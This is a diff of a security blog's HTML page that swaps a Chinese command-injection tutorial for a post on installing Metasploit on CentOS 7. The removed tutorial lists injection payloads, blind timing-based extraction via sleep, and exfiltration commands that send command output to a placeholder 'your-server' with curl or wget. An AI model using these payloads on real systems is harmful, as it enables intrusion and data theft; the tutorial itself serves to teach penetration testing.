@@ -74,7 +74,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="cmd-inject,pentest," />
+  <meta name="keywords" content="installation," />
 
 
 
@@ -90,17 +90,17 @@
 
 
 
-<meta name="description" content="枕上听新蝉，偷得浮日闲    命令注入漏洞可以让攻击者在操作系统上执行一个或多个命令。通过sleep命令(比如sleep 5)去观察请求的响应时间是检查该漏洞的最好方式之一。">
-<meta name="keywords" content="cmd-inject,pentest">
+<meta name="description" content="In the penetration test, you must meet the scene where you need a host with public ip addr for reversing shell. Let’s take the following instructions to install msf on centos 7 from scratch.">
+<meta name="keywords" content="installation">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【译】命令注入和原理">
-<meta property="og:url" content="/2017/06/22/cmd-inject/index.html">
+<meta property="og:title" content="Install msf on centos 7 from scratch">
+<meta property="og:url" content="/2017/11/28/Install-msf-on-centos7-from-scratch/index.html">
 <meta property="og:site_name" content="Ꭰ&#39;s security blog">
-<meta property="og:description" content="枕上听新蝉，偷得浮日闲    命令注入漏洞可以让攻击者在操作系统上执行一个或多个命令。通过sleep命令(比如sleep 5)去观察请求的响应时间是检查该漏洞的最好方式之一。">
-<meta property="og:updated_time" content="2017-06-21T17:08:43.000Z">
+<meta property="og:description" content="In the penetration test, you must meet the scene where you need a host with public ip addr for reversing shell. Let’s take the following instructions to install msf on centos 7 from scratch.">
+<meta property="og:updated_time" content="2017-11-28T00:37:54.193Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="【译】命令注入和原理">
-<meta name="twitter:description" content="枕上听新蝉，偷得浮日闲    命令注入漏洞可以让攻击者在操作系统上执行一个或多个命令。通过sleep命令(比如sleep 5)去观察请求的响应时间是检查该漏洞的最好方式之一。">
+<meta name="twitter:title" content="Install msf on centos 7 from scratch">
+<meta name="twitter:description" content="In the penetration test, you must meet the scene where you need a host with public ip addr for reversing shell. Let’s take the following instructions to install msf on centos 7 from scratch.">
 
 
 
@@ -128,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="/2017/06/22/cmd-inject/"/>
+  <link rel="canonical" href="/2017/11/28/Install-msf-on-centos7-from-scratch/"/>
 
 
 
 
 
-  <title>【译】命令注入和原理 | Ꭰ's security blog</title>
+  <title>Install msf on centos 7 from scratch | Ꭰ's security blog</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="en">
@@ -283,7 +283,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="/2017/06/22/cmd-inject/">
+    <link itemprop="mainEntityOfPage" href="/2017/11/28/Install-msf-on-centos7-from-scratch/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ꭰ">
@@ -300,7 +300,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">【译】命令注入和原理</h1>
+          <h1 class="post-title" itemprop="name headline">Install msf on centos 7 from scratch</h1>
         
 
         <div class="post-meta">
@@ -312,8 +312,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-22T00:55:27+08:00">
-                2017-06-22
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-28T08:39:59+08:00">
+                2017-11-28
               </time>
             
 
@@ -335,8 +335,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web/" itemprop="url" rel="index">
-                    <span itemprop="name">Web</span>
+                  <a href="/categories/MSF/" itemprop="url" rel="index">
+                    <span itemprop="name">MSF</span>
                   </a>
                 </span>
 
@@ -352,7 +352,7 @@
 
           
           
-             <span id="/2017/06/22/cmd-inject/" class="leancloud_visitors" data-flag-title="【译】命令注入和原理">
+             <span id="/2017/11/28/Install-msf-on-centos7-from-scratch/" class="leancloud_visitors" data-flag-title="Install msf on centos 7 from scratch">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -380,43 +380,70 @@
       
 
       
-        <blockquote class="blockquote-center"><p>枕上听新蝉，偷得浮日闲  </p>
+        <p>In the penetration test, you must meet the scene where you need a host with public ip addr for reversing shell. Let’s take the following instructions to install msf on centos 7 from scratch.</p>
+<a id="more"></a>
+<p>It’s a must for us to know a little about the Ruby because the MSF framework is written with Ruby. So the first thing is to install the latest Ruby on your vps.</p>
+<blockquote>
+<p>There are several ways to install Ruby:</p>
 </blockquote>
-<p><em>命令注入漏洞可以让攻击者在操作系统上执行一个或多个命令。通过sleep命令(比如sleep 5)去观察请求的响应时间是检查该漏洞的最好方式之一。</em><a id="more"></a>假定系统响应时间通常是在500毫秒左右，当你尝试进行命令注入时，如果响应时间是5500毫秒（5秒的任意倍数，但至少得比没有进行命令注入时的响应时间要长）则表明命令注入成功。为了确保不是误报，请使用不同的时间参数进行sleep的调用(sleep 3 ，sleep 10等等)。如果RTT与你所输入的参数符合，很有可能你发现了一个注入漏洞。并不是所有的命令注入都是同样的利用方式，尝试下面不同的payloads：</p>
-<ul>
-<li>;sleep 5</li>
-<li>&amp;&amp; sleep 5 &amp;&amp; echo</li>
-<li>| sleep 5 &amp;&amp; echo</li>
-<li>‘&amp;&amp; sleep 5 &amp;&amp; echo</li>
-<li>“&amp;&amp; sleep 5 &amp;&amp; echo</li>
-<li>&amp;(sleep 5)</li>
-</ul>
-<p>接下来要搞清楚这个漏洞是普通的命令注入漏洞还是盲打的命令注入(以下简称盲注入)。这两种类型的区别在于盲注入在响应中不返回任何命令执行的结果。普通的命令注入会在响应中返回命令执行的结果。sleep命令通常是很好的观点证明。如果你需要更多的证明，可以执行<em>id</em>或<em>whoami</em>命令并将它们的执行结果作为证明。有一点重要的要记住：大多数公司不会喜欢你在他们系统上进行嗅探，所以在利用漏洞进一步获取信息前，先向公司申请许可。</p>
-<p>盲注命令的利用有些棘手，但在大多数场景中，仍可被利用。盲注命令的目的是控制sleep命令（或其他类似命令）的输出。使用盲注的技巧在于你将猜测的字符或数字作为参数传给sleep命令。让我们来分析<em>sleep $(whoami | cut -c 1 | tr a 5)</em>这个例子。</p>
 <ol>
-<li>首先是<em>whoami</em>命令的执行，假设返回的结果是<em>user</em>。</li>
-<li><em>shell</em>会捕获输出并将其传给命令<em>cut -c 1</em>。这条命令会截取<em>user</em>的第一个字符<em>u</em>。</li>
-<li><em>shell</em>捕获<em>cut</em>命令的输出，将其传给<em>tr a 5</em>，这条命令会将<em>cut</em>命令中输出的字符<em>a</em>替换成5（这个例子中<em>cut</em>输出的是字符<em>u</em>，所以不会替换成数字5）</li>
-<li><em>tr</em>命令的输出作为参数传给<em>sleep</em>命令，<em>sleep u</em>命令会被执行。因为<em>sleep</em>函数第一个参数只接受数字类型，所以<em>sleep u</em>命令会导致<em>shell</em>立即抛出错误。上述这些过程的目的是通过<em>tr</em>命令来迭代字符。一旦_sleep $(whoami | cut -c 1 | tr u 5)执行了，请求的RTT时间肯定超过5秒。</li>
-<li>猜中第一个字符后，通过修改<em>cut -c</em>的参数来重复上述操作猜测剩下的字符。</li>
+<li><blockquote>
+<p>When you are on a UNIX-like operating system, using your system’s <strong>package manager</strong> is the easiest way of getting started. However, the packaged Ruby version usually is not the newest one.</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p><strong>Installer</strong> can be used to install specific or multiple Ruby version. There is also an installer for Windows.</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p><strong>Managers</strong> help you to switch between multiple Ruby installations on your system.</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>And finially, you can also <strong>build Ruby from source</strong></p>
+</blockquote>
+</li>
 </ol>
-<p>如果服务器的延迟相当高，可以使用多个<em>tr</em>命令组合不同的延迟参数来加速迭代过程。比如_sleep $(whoami | cut -c 1 | tr a 5 | tr b 10 | tr c 15 | tr d 20 | tr e 25)。只要在服务器返回响应前没有超时，你可以一直重复这个操作。如果你确定输出的语言类型，可以以语言中高频字符为基础优化正在暴力破解的第一个字符。这里有一份英语的高频字符内容：<a href="https://en.m.wikipedia.org/wiki/Frequency_analysis" target="_blank" rel="external">高频分析</a>。</p>
-<p>另一种利用盲注命令的方式是将输出发送到你所控制的服务器上。这种方式并不是万能的，因为有些系统可能将对外连接进行了屏蔽。在这种情况下，你会被前面的例子困住。但你仍应该尝试一番。首先观察下列命令是否存在，如果存在的话这种困境将更好解决。</p>
-<ul>
-<li><em>curl -h &amp;&amp; sleep 5</em></li>
-<li><em>wget -h &amp;&amp; sleep 5</em></li>
-<li><em>ssh -V &amp;&amp; sleep 5</em></li>
-<li><em>telnet &amp;&amp; sleep 5</em></li>
-</ul>
-<p>如果上述命令将RTT时间拉长到5秒以上，则证明命令注入漏洞存在。接着，你可以使用任意命令发送命令执行结果到你自己的服务器上。就像下面这样：</p>
-<ul>
-<li><em>whoami | curl <a href="http://your-server" target="_blank" rel="external">http://your-server</a></em> -d @-(在post请求体里寻找输出)</li>
-<li><em>wget <a href="http://your-server/$(whoami" target="_blank" rel="external">http://your-server/$(whoami</a>)</em> (在请求的URI中寻找输出)</li>
-<li><em>export C=whoami | ssh user@your-server</em> (在你自己的服务器上创建一个不需要密码授权的<em>user</em>账号，同时记录所有执行了的命令)</li>
-</ul>
-<p>这是另外一件你可以尝试去做的事情：如果系统是web服务器，试着在外部能访问的文件上写入输出结果。举个例子，如果当前用户能够在<em>/var/www</em>下进行写的操作并且这也是web服务器文件的来源的话，那么可以通过<em>whoami &gt; /var/www/output</em>命令来达到目的。接着只要访问<em><a href="http://the-server/output" target="_blank" rel="external">http://the-server/output</a></em>就能下载到输出结果。你也可以对服务器进行端口扫描来检测端口的情况。检查所有端口，看是否能够通过端口来下载命令执行的输出。</p>
-<p>愉快的黑客！</p>
-<p><a href="https://www.quora.com/What-is-command-injection-and-how-does-it-work/answer/Jobert-Abma?share=8502ef38&amp;srid=kl8Z" target="_blank" rel="external">原文</a></p>
+<blockquote>
+<p>Here I will show you the steps to install Ruby with managers, there are serveral managers to choose.</p>
+</blockquote>
+<ol>
+<li><blockquote>
+<p>chruby</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>rbenv</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>rvm</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>uru</p>
+</blockquote>
+</li>
+</ol>
+<p>I like use the RVM manager to install Ruby for convenience. Just type the following the command on your VPS(You can always get the command from <a href="https://rvm.io/" target="_blank" rel="external">rvm</a> ).</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB</div><div class="line"></div><div class="line">curl -sSL https://get.rvm.io | bash -s stable</div></pre></td></tr></table></figure>
+<p>For all in one installation append <code>--rails</code> or <code>--ruby</code> or <code>--ruby=1.9.3</code>. I added the param <code>—ruby</code> and then I used the  <code>rvm -v</code> and <code>rvm list</code> command to check the version.</p>
+<p><code>rvm -v</code></p>
+<p><code>rvm 1.29.3 (master) by Michal Papis, Piotr Kuczynski, Wayne E. Seguin [https://rvm.io]</code></p>
+<p><code>rvm list</code></p>
+<p><code>ruby-2.4.1 [ x86_64 ]</code></p>
+<p>Now, I copied the MSF from github.</p>
+<p><code>git clone https://github.com/rapid7/metasploit-framework.git</code></p>
+<p>When changing directory to the <code>metasploit-framework</code>, it prompts that I should upgrade the ruby to the latest version (This is always dynamic). The next step is to install <code>bundler</code>.</p>
+<p><code>gem install bundler</code></p>
+<p>The last step is to install MSF, just type <code>bundler install</code>. However it will fail during the installation. And you can always get the solutions from <a href="https://techglimpse.com/msfconsole-metasploit-launch-error-solutions/" target="_blank" rel="external">here</a>. Here are the errors when I execute <code>bundler install</code>.</p>
+<p><code>pcaprub.c:11:18: fatal error: pcap.h: No such file or directory</code></p>
+<p><code>Error: Can’t find the ‘libpq-fe.h header</code></p>
+<p>Those are denpencies problems, all we need to do is install them.</p>
+<p><code>yum install -y postgresql-devel libpcap-devel</code></p>
+<p>Now <code>bundler install</code> again.</p>
+<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>What’s the relation between the <code>rvm</code>, <code>gem</code> and <code>bunlder</code>. If you are familiar with NodeJs, you must know it. The <code>rvm</code> is the same as <code>nvm</code> just for different <code>Ruby</code>/<code>Node</code> versions installation, the <code>gem</code> is the same as <code>npm</code> for <code>package manager</code>. In Node, there is always a file named <code>package.json</code> in project, when you execute <code>npm install</code> then it will install all the dependencies described in the <code>package.json</code>. So as the <code>bunlder</code>, the only difference is that you need to install <code>bundler</code> frist with <code>gem install bundler</code> then execute <code>bundler install</code> .</p>
+<p>Happy weekday.</p>
 
       
     </div>
@@ -446,9 +473,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/cmd-inject/" rel="tag"># cmd-inject</a>
-          
-            <a href="/tags/pentest/" rel="tag"># pentest</a>
+            <a href="/tags/installation/" rel="tag"># installation</a>
           
         </div>
       
@@ -461,8 +486,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/06/17/how-to-ssrf/" rel="next" title="【译】如何伪造服务端请求-SSRF">
-                <i class="fa fa-chevron-left"></i> 【译】如何伪造服务端请求-SSRF
+              <a href="/2017/11/26/Escalating seven chars to get shell/" rel="next" title="Escalate seven chars rce to get shell">
+                <i class="fa fa-chevron-left"></i> Escalate seven chars rce to get shell
               </a>
             
           </div>
@@ -470,10 +495,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/06/23/pdo-inject-principle-analysis/" rel="prev" title="【转】PDO防注入原理分析以及使用PDO注意事项">
-                【转】PDO防注入原理分析以及使用PDO注意事项 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -522,8 +543,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/uploads/header.png"
@@ -619,6 +649,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary"><span class="nav-number">1.</span> <span class="nav-text">Summary</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
